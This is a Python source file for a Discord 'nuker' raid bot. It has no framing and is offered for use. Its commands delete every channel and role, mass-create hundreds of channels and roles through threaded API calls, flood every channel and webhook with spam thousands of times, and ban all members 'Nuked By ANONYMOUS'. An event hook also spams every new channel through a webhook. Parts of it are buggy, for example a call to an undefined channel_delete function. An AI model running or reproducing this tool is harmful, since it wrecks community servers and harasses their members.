import sys, discord, requests, json, threading, random, asyncio,aiohttp, time, os
from discord.ext import commands
import colorama
from colorama import Fore, Style, Back, Fore
from termcolor import colored
from time import sleep
from datetime import datetime


now = datetime.now()
ftime = now.strftime("%H:%M:%S")

session = requests.Session()

print(f'''{Fore.YELLOW}
                          ██╗░░░░░░█████╗░░██████╗░░██████╗░██╗███╗░░██╗
                          ██║░░░░░██╔══██╗██╔════╝░██╔════╝░██║████╗░██║
                          ██║░░░░░██║░░██║██║░░██╗░██║░░██╗░██║██╔██╗██║
                          ██║░░░░░██║░░██║██║░░╚██╗██║░░╚██╗██║██║╚████║
                          ███████╗╚█████╔╝╚██████╔╝╚██████╔╝██║██║░╚███║
                          ╚══════╝░╚════╝░░╚═════╝░░╚═════╝░╚═╝╚═╝░░╚══╝''')
print(f'''{Fore.WHITE}
                        ╭━━┳━━┳━━┳━━┳━━┳━━┳━━┳━━┳━━┳━━┳━━┳━━┳━━┳━━┳━━┳━━╮
                        ╰━━┻━━┻━━┻━━┻━━┻━━┻━━┻━━┻━━┻━━┻━━┻━━┻━━┻━━┻━━┻━━╯''')
print('')
print(f'''{Fore.YELLOW}
                                    ▀█▀ █▀█ █▄▀ █▀▀ █▄░█
                                    ░█░ █▄█ █░█ ██▄ █░▀█''')
print(f'''{Fore.WHITE}''')
print(f'''{Fore.WHITE}                            ──────────────────────────────────────''')
token = input("                           [?] Bot Token: ")
print(f'''{Fore.YELLOW}
                                    █▀█ █▀█ █▀▀ █▀▀ █ ▀▄▀
                                    █▀▀ █▀▄ ██▄ █▀░ █ █░█''')
print(f'''{Fore.WHITE}''')
print(f'''{Fore.WHITE}                            ──────────────────────────────────────''')
prefix = input("                            [?] what you want the prefix to be: ")
print(f'''{Fore.YELLOW} 
                                    █▀ ▀█▀ ▄▀█ ▀█▀ █░█ █▀
                                    ▄█ ░█░ █▀█ ░█░ █▄█ ▄█''')
print(f'''{Fore.WHITE}''')
print(f'''{Fore.WHITE}                            ──────────────────────────────────────''')
stats = input("                            [?] Status: ")
print(f'''{Fore.YELLOW}
                                █▀▀ █░█ ▄▀█ █▄░█   █▄░█ ▄▀█ █▀▄▀█ █▀▀
                                █▄▄ █▀█ █▀█ █░▀█   █░▀█ █▀█ █░▀░█ ██▄''')
print(f'''{Fore.WHITE}''')
print(f'''{Fore.WHITE}                            ──────────────────────────────────────''')
chan = input("                            [?] Channel Name: ")
print(f'''{Fore.YELLOW}
                                        ▀█▀ █▀▀ ▀▄▀ ▀█▀
                                        ░█░ ██▄ █░█ ░█░''')
print(f'''{Fore.WHITE}''')
print(f'''{Fore.WHITE}                            ──────────────────────────────────────''')
spamdata = input("                            [?] Spam content: ")
print(f'''{Fore.YELLOW}
                                        █▀█ █▀█ █░░ █▀▀ █▀
                                        █▀▄ █▄█ █▄▄ ██▄ ▄█''')
print(f'''{Fore.WHITE}''')
print(f'''{Fore.WHITE}                            ──────────────────────────────────────''')
rol = input("                            [?] role name: ")
print(f'''{Fore.YELLOW}
                                  █░█░█ █▀▀ █▄▄ █░█ █▀█ █▀█ █▄▀
                                   ▀▄▀▄▀ ██▄ █▄█ █▀█ █▄█ █▄█ █░█''')
print(f'''{Fore.WHITE}''')
print(f'''{Fore.WHITE}                            ──────────────────────────────────────''')
webname = input("                           [?] Spam Webhook names: ")
amountss = 1000
intents = discord.Intents().all()
intents.messages = True
bot = commands.Bot(command_prefix=prefix, intents=intents)
bot.remove_command("help")

# Clear the terminal screen
os.system('cls' if os.name == 'nt' else 'clear')


if bot:
  headers = {
    "Authorization": 
      f"Bot {token}"
  }
else:
  headers = {
    "Authorization": 
      token
  }

@bot.event
async def on_ready():
    print('')
    await bot.change_presence(activity=discord.Game(stats))
    print(f"{Fore.LIGHTRED_EX}")
    print('')  
    print(f"{Fore.YELLOW}")
    print("""
                ░██████╗██╗░░░██╗███╗░░██╗  ███╗░░██╗██╗░░░██╗██╗░░██╗███████╗██████╗░
                ██╔════╝██║░░░██║████╗░██║  ████╗░██║██║░░░██║██║░██╔╝██╔════╝██╔══██╗
                ╚█████╗░██║░░░██║██╔██╗██║  ██╔██╗██║██║░░░██║█████═╝░█████╗░░██████╔╝
                ░╚═══██╗██║░░░██║██║╚████║  ██║╚████║██║░░░██║██╔═██╗░██╔══╝░░██╔══██╗
                ██████╔╝╚██████╔╝██║░╚███║  ██║░╚███║╚██████╔╝██║░╚██╗███████╗██║░░██║
                ╚═════╝░░╚═════╝░╚═╝░░╚══╝  ╚═╝░░╚══╝░╚═════╝░╚═╝░░╚═╝╚══════╝╚═╝░░╚═╝""")

    print(f"{Fore.WHITE}                                      ᴄᴏᴍᴍᴀɴᴅs ғᴏʀ ᴛʜᴇ ʙᴏᴛ  ")
    print(f'{Fore.YELLOW}                                 ╔══════════════════════════════════╗')
    print(f'{Fore.YELLOW}                                 ║' + f'{Fore.WHITE}   [1] Nuke   ║   [5] scr'+ f'{Fore.YELLOW}         ║')
    print(f'{Fore.YELLOW}                                 ║' + f'{Fore.WHITE}   [2] scc    ║   [6] spam' + f'{Fore.YELLOW}        ║' )
    print(f'{Fore.YELLOW}                                 ║' + f'{Fore.WHITE}   [3] sdc    ║   [7] bm' + f'{Fore.WHITE}          ║')
    print(f'{Fore.YELLOW}                                 ║' + f'{Fore.WHITE}   [4] sdr    ║   [9] sd' + f'{Fore.WHITE}          ║')
    print(f'{Fore.WHITE}                                 ║' + f'{Fore.WHITE}   [8] swh    ║   ' + f'{Fore.WHITE}                ║')
    print(f'{Fore.WHITE}                                 ╚══════════════════════════════════╝')
    print(f"{Fore.WHITE}" + f"                              ᴘʀᴇғɪx - [{prefix}] ❘ ʟᴏɢɢᴇᴅ ɪɴ ᴀs- {bot.user.name}")  
    print(f"{Fore.WHITE}                                           ᴍᴀᴅᴇ ʙʏ ANONYMOUS                              ")
  
# ...

  

@bot.command()
async def scc(ctx):
    await ctx.message.delete()
    guild = ctx.guild.id
    def spc(i):
        json = {
          "name": i
        }
        session.post(
           f"https://discord.com/api/v9/guilds/{guild}/channels",
           headers=headers,
           json=json
        )
    for i in range(500):
           threading.Thread(
             target=spc,
             args=(chan, )
           ).start()

@bot.command()
async def scr(ctx):
    await ctx.message.delete()
    guild = ctx.guild.id
    def scrr(i):
        json = {
          "name": i
        }
        session.post(
           f"https://discord.com/api/v9/guilds/{guild}/roles",
           headers=headers,
           json=json
        )
    for i in range(250):
           threading.Thread(
             target=scrr,
             args=(chan, )
           ).start()

@bot.command()
async def sdr(ctx):
    await ctx.message.delete()
    for role in list(ctx.guild.roles):
        await role.delete()

@bot.command()
async def nuke(ctx):
    await ctx.message.delete()
    guild = ctx.guild.id
    for channel in list(ctx.guild.channels):
        await channel.delete()
    def cc(i):
        json = {
          "name": i
        }
        session.post(
          f"https://discord.com/api/v9/guilds/{guild}/channels",
          headers=headers,
          json=json
        )
    for i in range(250):
           for channel in list(ctx.guild.channels):   
               threading.Thread(
                    target=channel_delete,
                    args=(channel.id, )
               ).start()
    for i in range(250):
           threading.Thread(
             target=cc,
             args=(chan, )
           ).start()

@bot.command()
async def sdc(ctx):
    for channel in list(ctx.guild.channels):
        await channel.delete()
          
@bot.command()
async def spam(ctx):
    await ctx.message.delete()
    amountspam = 1000
    for i in range(amountspam):
        for channel in ctx.guild.channels:
            await channel.send(spamdata)

@bot.command()
async def swh(ctx):
    await ctx.message.delete()
    amountspam = 10000
    for i in range(amountspam):
        for webhook in ctx.guild.webhooks:
            await webhook.send(spamdata)
            
@bot.command()
async def mb(ctx):
  try:
    for members in ctx.guild.members:
      await members.ban(reason="Nuked By ANONYMOUS")
      print(Fore.GREEN + f"banned {members}")
  except:
    print(Fore.RED + f"cant ban {members}")

@bot.event
async def on_guild_channel_create(channel):
        try:
            webhook = await channel.create_webhook(name=webname)
            for i in range(10000):   
                 await webhook.send(spamdata)
        except:
            print("Ratelimited")
            
@bot.command()
async def sd(ctx):
    # Ask for confirmation in the terminal
    (f'''{Fore.WHITE}                 ─────────────────────────────────''')
    print(f'''{Fore.YELLOW}
                        █▀ █░█ █░█ ▀█▀ █▀▄ █▀█ █░█░█ █▄░█
                        ▄█ █▀█ █▄█ ░█░ █▄▀ █▄█ ▀▄▀▄▀ █░▀█''')
    ('')
    print(f'{Fore.WHITE}')
    confirmation = input("[?] Aʀᴇ ʏᴏᴜ sᴜʀᴇ ʏᴏᴜ ᴡᴀɴᴛ ᴛᴏ sʜᴜᴛ ᴅᴏᴡɴ ᴛʜᴇ ʙᴏᴛ? (ʏ/ɴ): ").strip().lower()
    if confirmation == 'y':
        shutdown_message = await ctx.send("Bot is shutting down.")
        await bot.close()  # Close the bot connection
        await shutdown_message.delete()  # Delete the shutdown message
        sys.exit()  # Exit the Python script
    else:
        shutdown_cancel_message = await ctx.send("Shutdown canceled.")
        await shutdown_cancel_message.delete()  # Delete the shutdown canceled message
        



bot.run(token)